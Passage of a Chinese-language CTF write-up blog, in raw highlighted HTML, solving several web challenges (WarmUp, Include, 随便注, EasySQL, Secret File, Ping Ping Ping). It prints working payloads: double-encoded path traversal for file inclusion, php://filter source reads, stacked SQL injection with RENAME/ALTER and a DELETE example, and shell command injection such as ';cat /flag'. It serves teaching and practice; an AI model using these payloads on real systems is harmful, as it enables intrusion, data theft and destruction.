punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，白名单过滤，需要返回了ture所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>           <span class="token variable">$page</span><span class="token punctuation">,</span>          <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">//这里和上面类似 查看_page 是否在白名单中</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里发现对_page进行了一次decode解码，</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token comment">//获取两个？？之间的内容</span>          <span class="token variable">$_page</span><span class="token punctuation">,</span>          <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//白名单</span>          <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token operator">*</span>必须满足<span class="token keyword">if</span>条件，才能包含file，这里也可以猜到可能考的是文件包含： <span class="token number">1</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>不为空 <span class="token number">2</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>是字符串 <span class="token number">3</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 为ture，回到checkFile 函数分析如何返回<span class="token constant boolean">true</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token delimiter important">?></span></span>可以看到函数代码中有四个if语句第一个if语句对变量进行检验，要求$page为字符串，否则返回false第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中'?'前部分，存在则返回true第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true若以上四个if语句均未返回值，则返回false有三个if语句可以返回true，第二个语句直接判断$page，不可用第三个语句截取'?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为'?'，仍可通过第四个if语句校验。（'?'两次编码值为'%253f'）,构造url：所以我们的payload 就是file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p><code>source.php?file=source.php%253f../../../../../ffffllllaaaagggg</code></p><blockquote><p>解释：</p><p>1、PHP $_REQUEST</p><p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p><p>2、?两次url编码后为：%253f</p><p>3、../../../../../猜测：根据ffffllllaaaagggg有四层的原因</p></blockquote><p>3、[极客大挑战 2019]Havefun</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string single-quoted-string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Syc&#123;cat_cat_cat_cat&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload:?cat=dog</p><p>注意：不能写成?cat=’dog’（猜测可能被当做字符参数被解析）</p></blockquote><h1 id="3、-ACTF2020-新生赛-Include"><a href="#3、-ACTF2020-新生赛-Include" class="headerlink" title="3、[ACTF2020 新生赛]Include"></a>3、[ACTF2020 新生赛]Include</h1><blockquote><p>只有：Can you find out the flag?</p></blockquote><p>源码也没有提示</p><p>无思路了，查询</p><p>主要思路：</p><p><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-387051.html">PHP中filter协议详解</a></p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用</a></p><p>读取源文件，并用base编码，绕过</p><p>base64编码结果为：</p><p><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzQ2NTQwYTAtMTI1MS00OGNmLTkyOWItODQ0NDVmMjc0ZTk4fQo=</code></p><p>解码后为：</p><p><code>&lt;?php echo &quot;Can you find out the flag?&quot;; //flag&#123;346540a0-1251-48cf-929b-84445f274e98&#125;</code></p></blockquote><p>可以看出：flag为注释内容，也就可以解释了，编码后可以看到完整源码</p><h1 id="4、-强网杯-2019-随便注"><a href="#4、-强网杯-2019-随便注" class="headerlink" title="4、[强网杯 2019]随便注"></a>4、[强网杯 2019]随便注</h1><h2 id="sql堆叠注入知识"><a href="#sql堆叠注入知识" class="headerlink" title="sql堆叠注入知识"></a>sql堆叠注入知识</h2><p>堆叠注入原理：</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p><a href="https://www.zhaoj.in/read-5873.html#0x04">解题具体步骤</a></p><p>思路总结：</p><blockquote><p>1.先判断有无注入点<br><code>输入1，回显错误；</code></p><p>`输入1#，正常回显；（说明存在sql注入）；</p><p><code>输入1&#39; or &#39;1&#39;=&#39;1（不进行注释#，依旧回显正常，证明判断正确）</code></p><p>2.判断字段<br><code>1&#39; order by 3 #（1、2均正确，3回显错误，说明有两个字段）《是不是说明了有两个回显位呢？》</code></p><p>3.继续查询<br><code>1&#39; union select 1,2#</code>回显错误返回：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);(正则匹配，过滤关键词)，到这里已经能看出来了：很多查询关键字都被过滤了，正常方法是查不到了</code></p><p>4.(查询到了表和字段，但是默认查询表中并没有咱们想要的flag，因此，想要拿到flag必须让默认查询的表与字段和flag所在名匹配  )《此处也可以看出，人家给的第二个默认查询表words并不是没用的（需要知道它内部的名字）》<br>他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢</p></blockquote><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><blockquote><p><code>/?inject=1&#39;;RENAME TABLE </code>words<code>TO</code>words1<code>;RENAME TABLE </code>1919810931114514<code>TO</code>words<code>;ALTER TABLE </code>words<code>CHANGE</code>flag<code> </code>id<code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p><p>改完后，默认查询id=1，就可以查到了</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payload:<span class="token number">1</span><span class="token string">' or 1 ='</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5、-ACTF2020-新生赛-Exec"><a href="#5、-ACTF2020-新生赛-Exec" class="headerlink" title="5、[ACTF2020 新生赛]Exec"></a>5、[ACTF2020 新生赛]Exec</h1><p><em><strong><u>给了一个ping的输入框</u></strong></em></p><blockquote><p>php模拟我们常用的DOS命令的ping命令方法，主要用到的是php的**<u>内置函数</u>**exec来调用系统的ping命令,从而实现ping命令功能。 </p><p>从而想到通过exec函数来进行RCE。 </p></blockquote><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a><code>知识点：</code></h2><p><code>注意使用exec函数必须需要服务器支持调用系统内置函数才行。另外也可以使用system等php内置函数来实现这个功能</code></p><p><code>exec执行一个外部程序</code></p><p><code>执行给予的命令command，不过它并不会输出任何东西，它简单的从命令的结果中传回最后一行，如果你需要去执行一个命令，并且从命令去取得所有资料时，可以使用passthru()这个函数。</code></p><p><code>system---执行外部程式并且显示输出</code></p><p><code>system()执行给予的命令command，并且输出结果。如果有给予参数return_var，则执行命令的状态码将会写到这个变量。</code></p><p><code>注意:如果你允许来自使用者输入的资料，可以传递到此函数，那么你应该使用escapeshellcmd()来确定此使用者无法哄骗(trick)系统来执行武断的(arbitrary)命令。</code></p><p><code>注意:如果你使用此函数来启动一个程式，而且希望在背景里(background)执行的时候离开它，你必须确定此程式的输出是转向(redirected)到一个文件或是一些输出的资料流，否则PHP将会悬挂(hang)直到程式执行结束。</code></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token comment">;前面和后面命令都要执行，无论前面真假</span>|直接执行后面的语句||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句&amp;前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">aaa ; cat /flag(cat flag错误，猜测：/可能是查找所有目录下的flag)aaa | cat /flagaaa ||cat /flagaaa &amp; cat /flag127.0.0.1 &amp;&amp; cat /flag(执行无flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_46918279/article/details/120243396?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165128968616782184694889%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165128968616782184694889&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-120243396.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BACTF2020+%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec+1&spm=1018.2226.3001.4187">参考</a></p><p><a href="https://www.cnblogs.com/nerrissa/articles/4929462.html">php命令exec</a></p><h1 id="6、-SUCTF-2019-EasySQL"><a href="#6、-SUCTF-2019-EasySQL" class="headerlink" title="6、[SUCTF 2019]EasySQL"></a>6、[SUCTF 2019]EasySQL</h1><h2 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h2><p><a href="https://www.php.cn/php-weizijiaocheng-254981.html">PHP短路运算符</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"国士无双，您一路走好，坚信未来也一定满是赤旗的世界"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//转换类型为bool型，a=1，b被短路</span>    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//bool不参与数值运算</span>    <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment">//1 21</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/u014029795/article/details/105241226?ops_request_misc=%7B%22request_id%22:%22165130361716782390589859%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165130361716782390589859&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-105241226.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BSUCTF+2019%5DEasySQL+1&spm=1018.2226.3001.4187"> 加深理解</a></p><p><a href="https://blog.csdn.net/StevenOnesir/article/details/110203051?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=1">高级思路打击</a></p><h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><h3 id="第一种：手工盲注"><a href="#第一种：手工盲注" class="headerlink" title="第一种：手工盲注"></a>第一种：手工盲注</h3><blockquote><p>他的后端既然能做到<strong>数字回显</strong>==<u><strong>字母不回显</strong></u>==，说明有一个 ==或== 结构，而且不直接回显flag，但作为一道题目，from一定是from flag。<br>所以猜测后端：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name type-declaration">select</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">flag</span> from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>结合：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> a <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>数字可以回显，字母不可以</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token operator">|</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> a<span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'|id from test'</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>字母字符均不可以</p></blockquote><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><p><code>*,1</code></p><p>相当于</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token keyword">from</span> Flag<span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> Flag语句含义：从Flag表中，查询所有字段，以及将最后一个字段值显示为<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="第二种：堆叠注入"><a href="#第二种：堆叠注入" class="headerlink" title="第二种：堆叠注入"></a>第二种：<strong>堆叠注入</strong></h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><p>看一个<code>writeup</code>上说，第一种解法是非预期解，预期解应该是<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>。<br>听都没听过，去查了下<code>set sql_mode=PIPES_AS_CONCAT</code>，用来处理<code>|</code>的符号的，将<code>或</code>操作改成<code>连接</code>操作。</p><h1 id="7、-极客大挑战-2019-Secret-File1"><a href="#7、-极客大挑战-2019-Secret-File1" class="headerlink" title="7、[极客大挑战 2019]Secret File1"></a>7、[极客大挑战 2019]Secret File1</h1><h2 id="题目环境："><a href="#题目环境：" class="headerlink" title="题目环境："></a>题目环境：</h2><blockquote><h1 id="你想知道蒋璐源的秘密么？"><a href="#你想知道蒋璐源的秘密么？" class="headerlink" title="你想知道蒋璐源的秘密么？"></a>你想知道蒋璐源的秘密么？</h1><p>想要的话可以给你，去找吧！把一切都放在那里了！</p></blockquote><p>F12看源码</p><blockquote><p><code>href=&quot;./Archive_room.php&quot;</code></p></blockquote><p>去看看</p><blockquote><h1 id="我把他们都放在这里了，去看看吧"><a href="#我把他们都放在这里了，去看看吧" class="headerlink" title="我把他们都放在这里了，去看看吧"></a>我把他们都放在这里了，去看看吧</h1><p><a href="http://b3d20ddb-6910-453b-9b82-04aa6ecfc653.node4.buuoj.cn:81/action.php">             SECRET         </a></p><p>Syclover @ cl4y</p></blockquote><blockquote><h1 id="查阅结束"><a href="#查阅结束" class="headerlink" title="查阅结束"></a>查阅结束</h1><p>没看清么？回去再仔细看看吧。</p><p>Syclover @ cl4y</p></blockquote><p>啥也没有，——&gt;页面是直接跳转的</p><h2 id="bp抓包"><a href="#bp抓包" class="headerlink" title="bp抓包"></a>bp抓包</h2><p>返回头中：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--   secr3t.php        --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续查看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flag放在了flag.php里</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="尝试传参："><a href="#尝试传参：" class="headerlink" title="尝试传参："></a>尝试传参：</h2><p><code>?file=flag.php</code></p><p>页面除了背景变黑没变化，F12中在style中背景改为白色，无</p><p>源码中过滤了一些关键字</p><h2 id="尝试使用filter过滤器"><a href="#尝试使用filter过滤器" class="headerlink" title="尝试使用filter过滤器"></a>尝试使用filter过滤器</h2><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行base64转码后得到flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping1"><a href="#GXYCTF2019-Ping-Ping-Ping1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping1"></a>[GXYCTF2019]Ping Ping Ping1</h2><p>环境描述：</p><blockquote><p>/?ip=</p></blockquote><p>ping一下本机：<code>ping 127.0.0.1</code></p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>继续：<code>ping 127.0.0.1;ls;</code></p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span aria-hidden="true" 